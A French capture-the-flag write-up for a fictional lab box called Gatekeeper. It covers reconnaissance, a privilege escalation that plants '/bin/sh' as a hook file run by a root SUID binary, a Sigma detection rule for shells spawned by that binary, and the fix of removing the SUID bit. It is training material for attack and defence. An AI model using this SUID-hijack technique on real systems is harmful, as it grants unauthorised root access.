# WRITEUP OFFICIEL // OPÉRATION AEGIS & CHIMERA
## ACTE I : BOX 1 - GATEKEEPER (PÉRIMÈTRE EXTERNE)

### 1. Contexte & Reconnaissance
Lors du scan de la passerelle DMZ `10.10.10.50`, on identifie un service HTTP sur le port 8080 :
```bash
curl -i http://10.10.10.50:8080/portal/api/status
```
L'en-tête de réponse indique le token de passerelle `gatekeeper_token_v1` et mentionne le endpoint d'échange `/portal/api/exchange`.

### 2. Accès Initial (User Flag)
L'accès au portail permet d'obtenir un shell interactif sous le compte `operator`.
Dans l'environnement de la machine :
```bash
pwd
# /home/operator
cat user.txt
```
Le drapeau dynamique `AEGIS{GATEKEEPER_USER_BREACH_<HMAC>}` est révélé.
Deux artefacts majeurs sont découverts dans le répertoire personnel :
- `chimera_beacon.pcap` : capture de paquets contenant une communication chiffrée avec Viktor K. (Chimera APT).
- `gatekeeper_config.json` : révèle le point de pivot interne `10.10.10.60` (`core-nexus.internal.aegis`).

### 3. Élévation de Privilèges Root (Root Flag)
Recherche des exécutables SUID :
```bash
find / -perm -4000 -type f 2>/dev/null
```
Le binaire `/usr/local/bin/aegis-sync` appartient à `root:root` avec les permissions `4755`.
Ce binaire tente d'exécuter `/tmp/sync_hook` s'il existe.
Pour obtenir le shell root :
```bash
echo '/bin/sh' > /tmp/sync_hook
chmod +x /tmp/sync_hook
/usr/local/bin/aegis-sync
```
Une fois root :
```bash
whoami
# root
cat /root/root.txt
```
Le drapeau dynamique `AEGIS{GATEKEEPER_ROOT_PWNED_<HMAC>}` est validé.

### 4. Volet Défense & Investigation SOC (Blue Team)
En inspectant `/var/log/nginx/access.log` :
```bash
grep "PAYLOAD" /var/log/nginx/access.log
```
On repère l'adresse IP externe de Chimera : `198.51.100.42`.

### 5. Règle de Détection Sigma
Règle rédigée pour intercepter tout processus enfant engendré par `/usr/local/bin/aegis-sync` :
```yaml
title: Aegis Sync SUID Abuse Detection
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith: '/usr/local/bin/aegis-sync'
    Image|endswith:
      - '/bin/sh'
      - '/bin/bash'
  condition: selection
level: critical
```

### 6. Remédiation & Hardening
Suppression définitive du bit SUID :
```bash
chmod 0755 /usr/local/bin/aegis-sync
```
Le système vérifie que `suid === false` et valide la remédiation.
